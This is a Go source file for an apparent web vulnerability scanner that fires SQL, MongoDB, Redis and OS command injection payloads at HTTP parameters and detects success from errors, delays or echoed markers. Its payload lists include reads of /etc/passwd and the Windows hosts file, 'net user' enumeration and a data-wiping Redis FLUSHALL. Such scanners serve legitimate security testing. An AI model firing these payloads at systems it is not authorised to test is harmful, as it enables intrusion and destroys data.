package injection

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// InjectionTestResult represents the result of an injection test
type InjectionTestResult struct {
	TestType      string                 `json:"test_type"`
	Vulnerable    bool                   `json:"vulnerable"`
	Details       string                 `json:"details"`
	Evidence      map[string]interface{} `json:"evidence,omitempty"`
	Risk          string                 `json:"risk"`
	Endpoint      string                 `json:"endpoint"`
	Method        string                 `json:"method"`
	Parameter     string                 `json:"parameter"`
	Payload       string                 `json:"payload"`
	StatusCode    int                    `json:"status_code"`
	ResponseSize  int                    `json:"response_size"`
	ResponseTime  time.Duration          `json:"response_time"`
	InjectionType string                 `json:"injection_type"`
}

// SQLInjectionConfig holds configuration for SQL injection testing
type SQLInjectionConfig struct {
	BasicPayloads     []string
	TimeBasedPayloads []string
	ErrorBasedEnabled bool
	TimeBasedEnabled  bool
	UnionBasedEnabled bool
}

// NoSQLInjectionConfig holds configuration for NoSQL injection testing
type NoSQLInjectionConfig struct {
	MongoDBPayloads []string
	RedisPayloads   []string
	CouchDBPayloads []string
}

// CommandInjectionConfig holds configuration for command injection testing
type CommandInjectionConfig struct {
	UnixPayloads    []string
	WindowsPayloads []string
	TimeBasedTest   bool
}

// InjectionTester performs various injection tests
type InjectionTester struct {
	client *http.Client
}

// NewInjectionTester creates a new injection tester
func NewInjectionTester(client *http.Client) *InjectionTester {
	if client == nil {
		client = &http.Client{Timeout: 30 * time.Second}
	}
	return &InjectionTester{client: client}
}

// TestSQLInjection performs comprehensive SQL injection testing
func (i *InjectionTester) TestSQLInjection(config SQLInjectionConfig, endpoint, method string) []InjectionTestResult {
	var results []InjectionTestResult

	// Extract parameters from endpoint
	params := i.extractParameters(endpoint, method)

	for _, param := range params {
		// Test 1: Error-based SQL injection
		if config.ErrorBasedEnabled {
			results = append(results, i.testErrorBasedSQLI(config, endpoint, method, param)...)
		}

		// Test 2: Time-based SQL injection
		if config.TimeBasedEnabled {
			results = append(results, i.testTimeBasedSQLI(config, endpoint, method, param)...)
		}

		// Test 3: Union-based SQL injection
		if config.UnionBasedEnabled {
			results = append(results, i.testUnionBasedSQLI(config, endpoint, method, param)...)
		}

		// Test 4: Boolean-based SQL injection
		results = append(results, i.testBooleanBasedSQLI(config, endpoint, method, param)...)
	}

	return results
}

// testErrorBasedSQLI tests for error-based SQL injection
func (i *InjectionTester) testErrorBasedSQLI(config SQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	errorPayloads := []string{
		"'",
		"\"",
		"' OR '1'='1",
		"' OR 1=1--",
		"' OR 1=1#",
		"'; SELECT 1--",
		"' UNION SELECT NULL--",
		"admin'--",
		"admin' #",
		"admin'/*",
		"' OR 1=1 LIMIT 1--",
		"') OR '1'='1--",
		"') OR ('1'='1--",
	}

	// Database-specific error patterns
	errorPatterns := map[string][]string{
		"MySQL": {
			"mysql_fetch_array",
			"mysql_num_rows",
			"mysql_error",
			"You have an error in your SQL syntax",
			"supplied argument is not a valid MySQL",
		},
		"PostgreSQL": {
			"pg_query",
			"pg_exec",
			"PostgreSQL query failed",
			"supplied argument is not a valid PostgreSQL",
		},
		"Oracle": {
			"ORA-00936",
			"ORA-00942",
			"ORA-01756",
			"oci_parse",
			"oracle",
		},
		"MSSQL": {
			"Microsoft OLE DB Provider",
			"Unclosed quotation mark",
			"Microsoft JET Database",
			"[Microsoft][ODBC SQL Server Driver]",
		},
		"SQLite": {
			"sqlite_query",
			"SQLite error",
			"sqlite3.OperationalError",
		},
	}

	for _, payload := range errorPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check for SQL error patterns in response
		responseBody := string(resp.Body)
		for dbType, patterns := range errorPatterns {
			for _, pattern := range patterns {
				if strings.Contains(strings.ToLower(responseBody), strings.ToLower(pattern)) {
					results = append(results, InjectionTestResult{
						TestType:      "SQL Injection",
						InjectionType: "Error-based",
						Vulnerable:    true,
						Details:       fmt.Sprintf("%s error detected in response", dbType),
						Risk:          "Critical",
						Endpoint:      modifiedEndpoint,
						Method:        method,
						Parameter:     param,
						Payload:       payload,
						StatusCode:    resp.StatusCode,
						ResponseSize:  len(resp.Body),
						ResponseTime:  responseTime,
						Evidence: map[string]interface{}{
							"database_type": dbType,
							"error_pattern": pattern,
							"error_context": i.extractErrorContext(responseBody, pattern),
						},
					})
					break
				}
			}
		}
	}

	return results
}

// testTimeBasedSQLI tests for time-based SQL injection
func (i *InjectionTester) testTimeBasedSQLI(config SQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	timeBasedPayloads := []string{
		"'; WAITFOR DELAY '0:0:5'--",
		"' OR 1=1 WAITFOR DELAY '0:0:5'--",
		"'; SELECT SLEEP(5)--",
		"' OR 1=1 AND SLEEP(5)--",
		"'; pg_sleep(5)--",
		"' OR 1=1 AND pg_sleep(5)--",
		"'; DBMS_LOCK.SLEEP(5);--",
		"' OR 1=1 AND DBMS_LOCK.SLEEP(5)--",
		"1'; waitfor delay '0:0:5'--",
		"1 OR 1=1 WAITFOR DELAY '0:0:5'--",
	}

	// Get baseline response time
	baselineTime := i.getBaselineResponseTime(endpoint, method)

	for _, payload := range timeBasedPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check if response time is significantly longer than baseline
		if responseTime > baselineTime+4*time.Second {
			results = append(results, InjectionTestResult{
				TestType:      "SQL Injection",
				InjectionType: "Time-based",
				Vulnerable:    true,
				Details:       fmt.Sprintf("Response delayed by %v, baseline: %v", responseTime, baselineTime),
				Risk:          "Critical",
				Endpoint:      modifiedEndpoint,
				Method:        method,
				Parameter:     param,
				Payload:       payload,
				StatusCode:    resp.StatusCode,
				ResponseSize:  len(resp.Body),
				ResponseTime:  responseTime,
				Evidence: map[string]interface{}{
					"baseline_time": baselineTime.String(),
					"delay_time":    responseTime.String(),
					"delay_diff":    (responseTime - baselineTime).String(),
				},
			})
		}
	}

	return results
}

// testUnionBasedSQLI tests for union-based SQL injection
func (i *InjectionTester) testUnionBasedSQLI(config SQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	// Try different numbers of columns
	for columns := 1; columns <= 10; columns++ {
		unionPayload := "' UNION SELECT " + strings.Repeat("NULL,", columns-1) + "NULL--"
		modifiedEndpoint := i.injectPayload(endpoint, param, unionPayload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check if union was successful (no SQL error and different response)
		responseBody := string(resp.Body)
		if !i.containsSQLError(responseBody) && resp.StatusCode == 200 {
			// Try to extract data
			dataPayload := fmt.Sprintf("' UNION SELECT %s,'INJECTION_TEST'%s--",
				strings.Repeat("NULL,", columns-2),
				strings.Repeat(",NULL", columns-2))

			if columns == 1 {
				dataPayload = "' UNION SELECT 'INJECTION_TEST'--"
			}

			dataEndpoint := i.injectPayload(endpoint, param, dataPayload)
			dataResp, err := i.makeRequest(dataEndpoint, method)

			if err == nil && strings.Contains(string(dataResp.Body), "INJECTION_TEST") {
				results = append(results, InjectionTestResult{
					TestType:      "SQL Injection",
					InjectionType: "Union-based",
					Vulnerable:    true,
					Details:       fmt.Sprintf("Union injection successful with %d columns", columns),
					Risk:          "Critical",
					Endpoint:      modifiedEndpoint,
					Method:        method,
					Parameter:     param,
					Payload:       unionPayload,
					StatusCode:    resp.StatusCode,
					ResponseSize:  len(resp.Body),
					ResponseTime:  responseTime,
					Evidence: map[string]interface{}{
						"columns_count":  columns,
						"data_extracted": true,
					},
				})
				break
			}
		}
	}

	return results
}

// testBooleanBasedSQLI tests for boolean-based SQL injection
func (i *InjectionTester) testBooleanBasedSQLI(config SQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	// Get baseline response
	baselineResp, err := i.makeRequest(endpoint, method)
	if err != nil {
		return results
	}

	truePayloads := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"' OR TRUE--",
		"') OR ('1'='1",
		"') OR 1=1--",
	}

	falsePayloads := []string{
		"' AND '1'='2",
		"' AND 1=2--",
		"' AND FALSE--",
		"') AND ('1'='2",
		"') AND 1=2--",
	}

	// Test true conditions
	for _, payload := range truePayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check if true condition produces different response than baseline
		if i.responsesDiffer(baselineResp, resp) {
			// Verify with false condition
			for _, falsePayload := range falsePayloads {
				falseEndpoint := i.injectPayload(endpoint, param, falsePayload)
				falseResp, err := i.makeRequest(falseEndpoint, method)

				if err == nil && !i.responsesDiffer(baselineResp, falseResp) {
					results = append(results, InjectionTestResult{
						TestType:      "SQL Injection",
						InjectionType: "Boolean-based",
						Vulnerable:    true,
						Details:       "Boolean condition manipulation affects response",
						Risk:          "High",
						Endpoint:      modifiedEndpoint,
						Method:        method,
						Parameter:     param,
						Payload:       payload,
						StatusCode:    resp.StatusCode,
						ResponseSize:  len(resp.Body),
						ResponseTime:  responseTime,
						Evidence: map[string]interface{}{
							"true_payload":  payload,
							"false_payload": falsePayload,
						},
					})
					break
				}
			}
		}
	}

	return results
}

// TestNoSQLInjection performs NoSQL injection testing
func (i *InjectionTester) TestNoSQLInjection(config NoSQLInjectionConfig, endpoint, method string) []InjectionTestResult {
	var results []InjectionTestResult

	params := i.extractParameters(endpoint, method)

	for _, param := range params {
		// Test MongoDB injection
		results = append(results, i.testMongoDBInjection(config, endpoint, method, param)...)

		// Test Redis injection
		results = append(results, i.testRedisInjection(config, endpoint, method, param)...)
	}

	return results
}

// testMongoDBInjection tests for MongoDB injection
func (i *InjectionTester) testMongoDBInjection(config NoSQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	mongoPayloads := []string{
		"true, $where: '1 == 1'",
		"$ne: 1",
		"'; return true; var dummy='",
		"'; return 'a' == 'a' && ''=='",
		"$regex: '.*'",
		"$exists: true",
		"$type: 2",
		"$where: 'this.password.match(/.*/')",
		"$or: [{'_id': 0}, {'_id': 1}]",
		"$nin: [15]",
		"$in: [true, false]",
		"$gt: ''",
		"[$ne]=1",
		"[$regex]=.*",
		"[$exists]=true",
	}

	for _, payload := range mongoPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check for MongoDB-specific responses
		responseBody := string(resp.Body)
		mongoErrors := []string{
			"MongoError",
			"ReferenceError",
			"SyntaxError",
			"TypeError",
			"mongo",
			"$where",
			"$regex",
		}

		for _, errorPattern := range mongoErrors {
			if strings.Contains(strings.ToLower(responseBody), strings.ToLower(errorPattern)) {
				results = append(results, InjectionTestResult{
					TestType:      "NoSQL Injection",
					InjectionType: "MongoDB",
					Vulnerable:    true,
					Details:       "MongoDB injection vulnerability detected",
					Risk:          "High",
					Endpoint:      modifiedEndpoint,
					Method:        method,
					Parameter:     param,
					Payload:       payload,
					StatusCode:    resp.StatusCode,
					ResponseSize:  len(resp.Body),
					ResponseTime:  responseTime,
					Evidence: map[string]interface{}{
						"error_pattern": errorPattern,
					},
				})
				break
			}
		}
	}

	return results
}

// testRedisInjection tests for Redis injection
func (i *InjectionTester) testRedisInjection(config NoSQLInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	redisPayloads := []string{
		"*",
		"FLUSHALL",
		"INFO",
		"CONFIG GET *",
		"EVAL \"return 'test'\" 0",
		"SCRIPT FLUSH",
		"KEYS *",
		"GET *",
		"SET test injection",
		"DEL test",
	}

	for _, payload := range redisPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check for Redis-specific responses
		responseBody := string(resp.Body)
		redisPatterns := []string{
			"redis_version",
			"ERR unknown command",
			"WRONGTYPE",
			"Redis",
			"redis.exceptions",
		}

		for _, pattern := range redisPatterns {
			if strings.Contains(strings.ToLower(responseBody), strings.ToLower(pattern)) {
				results = append(results, InjectionTestResult{
					TestType:      "NoSQL Injection",
					InjectionType: "Redis",
					Vulnerable:    true,
					Details:       "Redis injection vulnerability detected",
					Risk:          "High",
					Endpoint:      modifiedEndpoint,
					Method:        method,
					Parameter:     param,
					Payload:       payload,
					StatusCode:    resp.StatusCode,
					ResponseSize:  len(resp.Body),
					ResponseTime:  responseTime,
					Evidence: map[string]interface{}{
						"error_pattern": pattern,
					},
				})
				break
			}
		}
	}

	return results
}

// TestCommandInjection performs command injection testing
func (i *InjectionTester) TestCommandInjection(config CommandInjectionConfig, endpoint, method string) []InjectionTestResult {
	var results []InjectionTestResult

	params := i.extractParameters(endpoint, method)

	for _, param := range params {
		// Test Unix command injection
		results = append(results, i.testUnixCommandInjection(config, endpoint, method, param)...)

		// Test Windows command injection
		results = append(results, i.testWindowsCommandInjection(config, endpoint, method, param)...)

		// Test time-based command injection
		if config.TimeBasedTest {
			results = append(results, i.testTimeBasedCommandInjection(config, endpoint, method, param)...)
		}
	}

	return results
}

// testUnixCommandInjection tests for Unix command injection
func (i *InjectionTester) testUnixCommandInjection(config CommandInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	unixPayloads := []string{
		"; ls",
		"| ls",
		"& ls",
		"&& ls",
		"|| ls",
		"; id",
		"| id",
		"; whoami",
		"| whoami",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"; uname -a",
		"| uname -a",
		"`id`",
		"$(id)",
		"`whoami`",
		"$(whoami)",
		"; echo 'INJECTION_TEST'",
		"| echo 'INJECTION_TEST'",
		"`echo INJECTION_TEST`",
		"$(echo INJECTION_TEST)",
	}

	for _, payload := range unixPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check for command execution evidence
		responseBody := string(resp.Body)
		commandPatterns := []string{
			"INJECTION_TEST",
			"uid=",
			"gid=",
			"root:",
			"bash",
			"/bin/",
			"/usr/bin/",
			"Linux",
			"GNU/Linux",
		}

		for _, pattern := range commandPatterns {
			if strings.Contains(responseBody, pattern) {
				results = append(results, InjectionTestResult{
					TestType:      "Command Injection",
					InjectionType: "Unix",
					Vulnerable:    true,
					Details:       "Unix command execution detected",
					Risk:          "Critical",
					Endpoint:      modifiedEndpoint,
					Method:        method,
					Parameter:     param,
					Payload:       payload,
					StatusCode:    resp.StatusCode,
					ResponseSize:  len(resp.Body),
					ResponseTime:  responseTime,
					Evidence: map[string]interface{}{
						"command_pattern":  pattern,
						"response_excerpt": i.extractCommandContext(responseBody, pattern),
					},
				})
				break
			}
		}
	}

	return results
}

// testWindowsCommandInjection tests for Windows command injection
func (i *InjectionTester) testWindowsCommandInjection(config CommandInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	windowsPayloads := []string{
		"& dir",
		"| dir",
		"&& dir",
		"|| dir",
		"& whoami",
		"| whoami",
		"& echo INJECTION_TEST",
		"| echo INJECTION_TEST",
		"& ipconfig",
		"| ipconfig",
		"& net user",
		"| net user",
		"& systeminfo",
		"| systeminfo",
		"& type C:\\Windows\\System32\\drivers\\etc\\hosts",
		"| type C:\\Windows\\System32\\drivers\\etc\\hosts",
	}

	for _, payload := range windowsPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check for Windows command execution evidence
		responseBody := string(resp.Body)
		windowsPatterns := []string{
			"INJECTION_TEST",
			"Volume in drive",
			"Directory of",
			"C:\\",
			"Windows IP Configuration",
			"Microsoft Windows",
			"NT AUTHORITY",
		}

		for _, pattern := range windowsPatterns {
			if strings.Contains(responseBody, pattern) {
				results = append(results, InjectionTestResult{
					TestType:      "Command Injection",
					InjectionType: "Windows",
					Vulnerable:    true,
					Details:       "Windows command execution detected",
					Risk:          "Critical",
					Endpoint:      modifiedEndpoint,
					Method:        method,
					Parameter:     param,
					Payload:       payload,
					StatusCode:    resp.StatusCode,
					ResponseSize:  len(resp.Body),
					ResponseTime:  responseTime,
					Evidence: map[string]interface{}{
						"command_pattern":  pattern,
						"response_excerpt": i.extractCommandContext(responseBody, pattern),
					},
				})
				break
			}
		}
	}

	return results
}

// testTimeBasedCommandInjection tests for time-based command injection
func (i *InjectionTester) testTimeBasedCommandInjection(config CommandInjectionConfig, endpoint, method, param string) []InjectionTestResult {
	var results []InjectionTestResult

	timeBasedPayloads := []string{
		"; sleep 5",
		"| sleep 5",
		"& sleep 5",
		"&& sleep 5",
		"`sleep 5`",
		"$(sleep 5)",
		"; ping -c 1 127.0.0.1",
		"| ping -c 1 127.0.0.1",
		"& timeout 5",
		"| timeout 5",
		"& ping -n 5 127.0.0.1",
		"| ping -n 5 127.0.0.1",
	}

	// Get baseline response time
	baselineTime := i.getBaselineResponseTime(endpoint, method)

	for _, payload := range timeBasedPayloads {
		modifiedEndpoint := i.injectPayload(endpoint, param, payload)

		start := time.Now()
		resp, err := i.makeRequest(modifiedEndpoint, method)
		responseTime := time.Since(start)

		if err != nil {
			continue
		}

		// Check if response time is significantly longer than baseline
		if responseTime > baselineTime+4*time.Second {
			results = append(results, InjectionTestResult{
				TestType:      "Command Injection",
				InjectionType: "Time-based",
				Vulnerable:    true,
				Details:       fmt.Sprintf("Command delay detected: %v (baseline: %v)", responseTime, baselineTime),
				Risk:          "Critical",
				Endpoint:      modifiedEndpoint,
				Method:        method,
				Parameter:     param,
				Payload:       payload,
				StatusCode:    resp.StatusCode,
				ResponseSize:  len(resp.Body),
				ResponseTime:  responseTime,
				Evidence: map[string]interface{}{
					"baseline_time": baselineTime.String(),
					"delay_time":    responseTime.String(),
					"delay_diff":    (responseTime - baselineTime).String(),
				},
			})
		}
	}

	return results
}

// Helper methods

// HTTPResponse represents a simplified HTTP response
type HTTPResponse struct {
	StatusCode int
	Body       []byte
	Headers    map[string]string
}

// makeRequest makes an HTTP request and returns simplified response
func (i *InjectionTester) makeRequest(endpoint, method string) (*HTTPResponse, error) {
	req, err := http.NewRequest(method, endpoint, nil)
	if err != nil {
		return nil, err
	}

	resp, err := i.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body := make([]byte, 0)
	// Read response body (truncated for performance)
	buffer := make([]byte, 8192)
	n, _ := resp.Body.Read(buffer)
	if n > 0 {
		body = buffer[:n]
	}

	headers := make(map[string]string)
	for key, values := range resp.Header {
		if len(values) > 0 {
			headers[key] = values[0]
		}
	}

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Body:       body,
		Headers:    headers,
	}, nil
}

// extractParameters extracts parameters from endpoint
func (i *InjectionTester) extractParameters(endpoint, method string) []string {
	var params []string

	// Extract query parameters
	if strings.Contains(endpoint, "?") {
		parsedURL, err := url.Parse(endpoint)
		if err == nil {
			for key := range parsedURL.Query() {
				params = append(params, key)
			}
		}
	}

	// Extract path parameters (assume numeric values in path are parameters)
	re := regexp.MustCompile(`/(\d+)(?:/|$)`)
	matches := re.FindAllStringSubmatch(endpoint, -1)
	for _, match := range matches {
		if len(match) > 1 {
			params = append(params, "path_"+match[1])
		}
	}

	return params
}

// injectPayload injects payload into parameter
func (i *InjectionTester) injectPayload(endpoint, param, payload string) string {
	if strings.HasPrefix(param, "path_") {
		// Path parameter injection
		originalValue := strings.TrimPrefix(param, "path_")
		return strings.Replace(endpoint, "/"+originalValue, "/"+url.QueryEscape(payload), 1)
	}

	// Query parameter injection
	if strings.Contains(endpoint, "?") {
		parsedURL, err := url.Parse(endpoint)
		if err == nil {
			params := parsedURL.Query()
			params.Set(param, payload)
			parsedURL.RawQuery = params.Encode()
			return parsedURL.String()
		}
	}

	// If no existing parameters, add as query parameter
	separator := "?"
	if strings.Contains(endpoint, "?") {
		separator = "&"
	}
	return endpoint + separator + param + "=" + url.QueryEscape(payload)
}

// getBaselineResponseTime gets baseline response time for an endpoint
func (i *InjectionTester) getBaselineResponseTime(endpoint, method string) time.Duration {
	var totalTime time.Duration
	attempts := 3

	for j := 0; j < attempts; j++ {
		start := time.Now()
		_, err := i.makeRequest(endpoint, method)
		if err == nil {
			totalTime += time.Since(start)
		}
	}

	return totalTime / time.Duration(attempts)
}

// containsSQLError checks if response contains SQL error patterns
func (i *InjectionTester) containsSQLError(response string) bool {
	errorPatterns := []string{
		"mysql_fetch_array",
		"ORA-00936",
		"Microsoft OLE DB Provider",
		"sqlite_query",
		"PostgreSQL query failed",
		"syntax error",
		"mysql_num_rows",
	}

	response = strings.ToLower(response)
	for _, pattern := range errorPatterns {
		if strings.Contains(response, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

// responsesDiffer checks if two responses are significantly different
func (i *InjectionTester) responsesDiffer(resp1, resp2 *HTTPResponse) bool {
	// Check status code
	if resp1.StatusCode != resp2.StatusCode {
		return true
	}

	// Check body length difference
	lengthDiff := len(resp1.Body) - len(resp2.Body)
	if lengthDiff < 0 {
		lengthDiff = -lengthDiff
	}

	// Consider significant if difference is more than 10% or 100 bytes
	if lengthDiff > len(resp1.Body)/10 || lengthDiff > 100 {
		return true
	}

	return false
}

// extractErrorContext extracts context around error pattern
func (i *InjectionTester) extractErrorContext(response, pattern string) string {
	index := strings.Index(strings.ToLower(response), strings.ToLower(pattern))
	if index == -1 {
		return ""
	}

	start := index - 50
	if start < 0 {
		start = 0
	}

	end := index + len(pattern) + 50
	if end > len(response) {
		end = len(response)
	}

	return response[start:end]
}

// extractCommandContext extracts context around command pattern
func (i *InjectionTester) extractCommandContext(response, pattern string) string {
	return i.extractErrorContext(response, pattern)
}

// GetDefaultSQLInjectionConfig returns default SQL injection configuration
func GetDefaultSQLInjectionConfig() SQLInjectionConfig {
	return SQLInjectionConfig{
		ErrorBasedEnabled: true,
		TimeBasedEnabled:  true,
		UnionBasedEnabled: true,
		BasicPayloads: []string{
			"'", "\"", "' OR '1'='1", "' OR 1=1--",
			"admin'--", "admin' #", "' UNION SELECT NULL--",
		},
		TimeBasedPayloads: []string{
			"'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--",
			"'; pg_sleep(5)--", "'; DBMS_LOCK.SLEEP(5);--",
		},
	}
}

// GetDefaultNoSQLInjectionConfig returns default NoSQL injection configuration
func GetDefaultNoSQLInjectionConfig() NoSQLInjectionConfig {
	return NoSQLInjectionConfig{
		MongoDBPayloads: []string{
			"true, $where: '1 == 1'", "$ne: 1", "$regex: '.*'",
			"$exists: true", "$or: [{'_id': 0}, {'_id': 1}]",
		},
		RedisPayloads: []string{
			"*", "FLUSHALL", "INFO", "CONFIG GET *",
			"EVAL \"return 'test'\" 0", "KEYS *",
		},
	}
}

// GetDefaultCommandInjectionConfig returns default command injection configuration
func GetDefaultCommandInjectionConfig() CommandInjectionConfig {
	return CommandInjectionConfig{
		TimeBasedTest: true,
		UnixPayloads: []string{
			"; ls", "| ls", "; id", "| whoami",
			"`echo INJECTION_TEST`", "$(echo INJECTION_TEST)",
		},
		WindowsPayloads: []string{
			"& dir", "| dir", "& whoami", "| whoami",
			"& echo INJECTION_TEST", "| echo INJECTION_TEST",
		},
	}
}
